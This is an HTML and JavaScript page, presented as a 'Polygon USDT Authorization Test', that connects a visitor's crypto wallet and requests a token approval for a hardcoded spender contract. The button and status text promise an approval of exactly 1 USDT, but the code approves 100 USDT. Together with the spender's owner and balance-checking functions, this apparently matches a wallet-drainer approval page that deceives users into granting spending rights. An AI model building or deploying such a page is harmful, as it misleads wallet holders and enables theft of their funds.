<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">

<title>Polygon USDT Test</title>

<script src="https://cdn.jsdelivr.net/npm/ethers@6.13.4/dist/ethers.umd.min.js"></script>
</head>

<body>

<h3>Polygon USDT Authorization Test</h3>

<p id="status">Checking wallet...</p>

<button id="approveBtn">
    Authorize 1 USDT
</button>

<br><br>

<button id="checkBtn">
    Check Allowance / Balance
</button>

<br><br>

<div id="details"></div>

<script>

const POLYGON_CHAIN_ID = 137;

const USDT =
    "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";

// IMPORTANT:
// Put the actual Polygon USDTSpender deployment here.
const SPENDER =
    "0xf15AB8Df93e89759c7AE5E3BeB821532aAF24F4C";

const AMOUNT =
    ethers.parseUnits("100", 6);


const USDT_ABI = [

    "function approve(address spender,uint256 amount) returns(bool)",

    "function allowance(address owner,address spender) view returns(uint256)",

    "function balanceOf(address owner) view returns(uint256)"
];


const SPENDER_ABI = [

    "function owner() view returns(address)",

    "function token() view returns(address)",

    "function checkAllowance(address user) view returns(uint256)",

    "function checkBalance(address user) view returns(uint256)"

];


const statusEl =
    document.getElementById("status");

const detailsEl =
    document.getElementById("details");

const approveBtn =
    document.getElementById("approveBtn");

const checkBtn =
    document.getElementById("checkBtn");


let provider;
let signer;
let user;


/* -----------------------------
   Initialize wallet
----------------------------- */

async function init() {

    try {

        if (!window.ethereum) {

            statusEl.innerText =
                "Open this page inside Trust Wallet, MetaMask or another EVM wallet.";

            return;
        }


        provider =
            new ethers.BrowserProvider(
                window.ethereum
            );


        const accounts =
            await provider.send(
                "eth_accounts",
                []
            );


        const network =
            await provider.getNetwork();


        const chainId =
            Number(network.chainId);


        if (chainId !== POLYGON_CHAIN_ID) {

            statusEl.innerText =
                `Wrong network. Current chain ID: ${chainId}. Switch to Polygon.`;

            return;
        }


        if (accounts.length > 0) {

            user = accounts[0];

            signer =
                await provider.getSigner();

            statusEl.innerText =
                `Connected: ${user} | Polygon`;

        } else {

            statusEl.innerText =
                "Polygon wallet detected — tap Authorize 1 USDT.";

        }

    } catch(error) {

        console.error(error);

        statusEl.innerText =
            error.message;
    }
}


/* -----------------------------
   Request wallet account
----------------------------- */

async function getSigner() {

    if (!provider) {

        provider =
            new ethers.BrowserProvider(
                window.ethereum
            );
    }


    let accounts =
        await provider.send(
            "eth_accounts",
            []
        );


    if (!accounts.length) {

        accounts =
            await provider.send(
                "eth_requestAccounts",
                []
            );
    }


    user =
        accounts[0];


    signer =
        await provider.getSigner();


    const network =
        await provider.getNetwork();


    if (
        Number(network.chainId)
        !== POLYGON_CHAIN_ID
    ) {

        throw new Error(
            "Please switch wallet to Polygon."
        );
    }


    return signer;
}


/* -----------------------------
   Approve exactly 1 USDT
----------------------------- */

approveBtn.onclick =
async () => {

    approveBtn.disabled = true;

    try {

        await getSigner();


        if (
            !ethers.isAddress(SPENDER)
        ) {

            throw new Error(
                "Invalid spender contract address."
            );
        }


        const usdt =
            new ethers.Contract(
                USDT,
                USDT_ABI,
                signer
            );


        const previousAllowance =
            await usdt.allowance(
                user,
                SPENDER
            );


        if (
            previousAllowance >= AMOUNT
        ) {

            statusEl.innerText =
                "This wallet already authorized at least 1 USDT.";

            return;
        }


        statusEl.innerText =
            "Confirm the 1 USDT approval in your wallet...";


        const tx =
            await usdt.approve(
                SPENDER,
                AMOUNT
            );


        statusEl.innerText =
            `Approval submitted: ${tx.hash}`;


        const receipt =
            await tx.wait();


        statusEl.innerText =
            `✓ 1 USDT authorized on Polygon. TX: ${receipt.hash}`;


        await checkState();

    }

    catch(error) {

        console.error(error);

        statusEl.innerText =
            error.shortMessage ||
            error.message;
    }

    finally {

        approveBtn.disabled = false;
    }
};


/* -----------------------------
   Check balance + allowance
----------------------------- */

async function checkState() {

    await getSigner();


    const usdt =
        new ethers.Contract(
            USDT,
            USDT_ABI,
            provider
        );


    const spender =
        new ethers.Contract(
            SPENDER,
            SPENDER_ABI,
            provider
        );


    const balance =
        await usdt.balanceOf(user);


    const allowance =
        await usdt.allowance(
            user,
            SPENDER
        );


    const contractOwner =
        await spender.owner();


    detailsEl.innerHTML = `

        <p>
        Wallet:
        ${user}
        </p>

        <p>
        USDT balance:
        ${ethers.formatUnits(balance,6)}
        </p>

        <p>
        Spender allowance:
        ${ethers.formatUnits(allowance,6)} USDT
        </p>

        <p>
        Spender contract:
        ${SPENDER}
        </p>

        <p>
        Contract owner:
        ${contractOwner}
        </p>
    `;
}


checkBtn.onclick =
async () => {

    try {

        await checkState();

    } catch(error) {

        console.error(error);

        statusEl.innerText =
            error.shortMessage ||
            error.message;
    }
};


window.ethereum?.on(
    "chainChanged",
    () => location.reload()
);


window.ethereum?.on(
    "accountsChanged",
    () => location.reload()
);


init();

</script>

</body>
</html>
